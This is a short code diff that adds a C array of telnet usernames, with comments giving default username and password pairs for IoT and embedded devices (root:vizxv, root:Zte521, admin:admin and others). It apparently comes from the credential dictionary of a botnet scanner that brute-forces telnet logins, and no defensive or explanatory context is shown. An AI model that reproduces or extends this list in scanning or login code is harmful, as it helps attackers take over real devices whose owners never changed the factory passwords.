@@ -1,0 +1,12 @@
+char *Telnet_Usernames[] = {
+   
+    "telnet\0", //telnet:telnet
+    "root\0", //root:root
+    "root\0", //root:1234
+    "root\0", //root:12345
+    "root\0", //root:oelinux123
+    "admin\0", //admin:admin
+    "root\0", //root:Zte521
+    "root\0", //root:vizxv
+    "admin\0", //admin:1234
+			   };
